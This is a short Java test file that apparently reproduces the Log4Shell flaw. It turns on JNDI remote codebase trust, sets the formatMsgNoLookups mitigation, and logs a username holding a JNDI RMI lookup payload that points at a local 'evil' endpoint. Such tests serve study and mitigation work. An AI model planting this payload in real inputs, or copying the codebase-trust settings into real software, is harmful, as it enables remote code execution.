package com.accumulate.personal;

import java.io.IOException;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Main
 *
 * @author zhutao
 * @date 2021/12/14 3:44 下午
 */
public class Main {

    private static final Logger logger = LoggerFactory.getLogger(Main.class);


    public static void main(String[] args) throws IOException {

        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");


        System.setProperty("log4j2.formatMsgNoLookups", "true");
        String username = "${jndi:rmi://127.0.0.1:1099/evil}";
        logger.error("username:{}", username);
    }

}
